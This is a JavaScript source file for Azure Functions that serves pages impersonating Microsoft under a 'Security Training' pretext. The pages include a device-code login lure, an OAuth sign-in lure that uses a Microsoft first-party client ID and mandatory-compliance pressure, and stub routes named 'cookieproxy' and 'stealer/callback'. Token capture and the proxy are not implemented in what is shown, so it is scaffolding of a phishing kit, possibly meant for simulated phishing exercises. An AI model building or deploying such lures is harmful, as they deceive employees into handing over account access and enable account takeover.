const { app } = require('@azure/functions');

app.http('devicecode', {
    methods: ['GET'],
    authLevel: 'anonymous',
    route: 'secure-access',
    handler: async (request, context) => {
        context.log('Device code function called');
        
        const html = `
        <!DOCTYPE html>
        <html>
        <head>
            <title>Microsoft Security Training</title>
            <style>
                body { font-family: 'Segoe UI', Arial, sans-serif; margin: 0; padding: 20px; background-color: #f5f5f5; }
                .container { max-width: 800px; margin: 0 auto; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
                .ms-logo { color: #00BCF2; font-size: 24px; font-weight: bold; margin-bottom: 20px; }
                .device-code { background: #e3f2fd; padding: 15px; border-radius: 4px; font-size: 18px; font-weight: bold; text-align: center; margin: 20px 0; }
                .btn { background: #0078d4; color: white; padding: 12px 30px; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; text-decoration: none; display: inline-block; }
                .btn:hover { background: #106ebe; }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="ms-logo">Microsoft Security Training</div>
                <h1>Device Login Required</h1>
                <p>To access this security training module, you need to authenticate with your Microsoft account using device login.</p>
                
                <div class="device-code">DEVICE CODE: ABC123</div>
                
                <p>1. Go to <strong>microsoft.com/devicelogin</strong></p>
                <p>2. Enter the device code shown above</p>
                <p>3. Sign in with your Microsoft account</p>
                
                <a href="https://microsoft.com/devicelogin" class="btn" target="_blank">Open Device Login</a>
                
                <p><small>This is a simulated training environment. Contact your IT department if you have questions.</small></p>
            </div>
        </body>
        </html>`;
        
        return {
            status: 200,
            headers: {
                'Content-Type': 'text/html'
            },
            body: html
        };
    }
});

app.http('oauth', {
    methods: ['GET'],
    authLevel: 'anonymous',  
    route: 'microsoft-training',
    handler: async (request, context) => {
        context.log('OAuth function called');
        
        const client_id = '1950a258-227b-4e31-a9cf-717495945fc2';
        const redirect_uri = 'https://login.microsoftonline.com/common/oauth2/nativeclient';
        const scopes = 'openid profile email User.Read';
        
        const oauth_url = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=${client_id}&response_type=code&redirect_uri=${encodeURIComponent(redirect_uri)}&scope=${encodeURIComponent(scopes)}&state=training`;
        
        const html = `
        <!DOCTYPE html>
        <html>
        <head>
            <title>Microsoft 365 Security Training</title>
            <style>
                body { font-family: 'Segoe UI', Arial, sans-serif; margin: 0; padding: 20px; background-color: #f5f5f5; }
                .container { max-width: 800px; margin: 0 auto; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
                .ms-logo { color: #00BCF2; font-size: 24px; font-weight: bold; margin-bottom: 20px; }
                .btn { background: #0078d4; color: white; padding: 12px 30px; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; text-decoration: none; display: inline-block; }
                .btn:hover { background: #106ebe; }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="ms-logo">Microsoft 365 Security Training</div>
                <h1>Security Awareness Training</h1>
                <p>Welcome to the Microsoft 365 Security Training module. This training covers:</p>
                <ul>
                    <li>Phishing detection and prevention</li>
                    <li>Multi-factor authentication best practices</li>
                    <li>Data protection and compliance</li>
                    <li>Threat intelligence and response</li>
                </ul>
                
                <p>To begin the training, please authenticate with your Microsoft 365 account:</p>
                
                <a href="${oauth_url}" class="btn">Start Training - Sign In</a>
                
                <p><small>This training is mandatory for all employees. Your completion will be tracked for compliance purposes.</small></p>
            </div>
        </body>
        </html>`;
        
        return {
            status: 200,
            headers: {
                'Content-Type': 'text/html'
            },
            body: html
        };
    }
});

app.http('proxy', {
    methods: ['GET', 'POST'],
    authLevel: 'anonymous',
    route: 'cookieproxy/{*path}',
    handler: async (request, context) => {
        context.log('Proxy function called with path:', request.params.path);
        
        return {
            status: 200,
            headers: {
                'Content-Type': 'text/html'
            },
            body: `
            <!DOCTYPE html>
            <html>
            <head><title>Microsoft Login</title></head>
            <body>
                <h1>Proxy Function Working</h1>
                <p>Path: ${request.params.path}</p>
                <p>This would proxy to: https://${request.params.path}</p>
            </body>
            </html>`
        };
    }
});

app.http('callback', {
    methods: ['GET', 'POST'],
    authLevel: 'anonymous',
    route: 'stealer/callback',
    handler: async (request, context) => {
        context.log('Callback function called');
        
        return {
            status: 200,
            headers: {
                'Content-Type': 'text/html'
            },
            body: `
            <!DOCTYPE html>
            <html>
            <head><title>Training Complete</title></head>
            <body>
                <h1>Training Session Complete</h1>
                <p>Thank you for completing the security training.</p>
                <p>You may now close this window.</p>
            </body>
            </html>`
        };
    }
});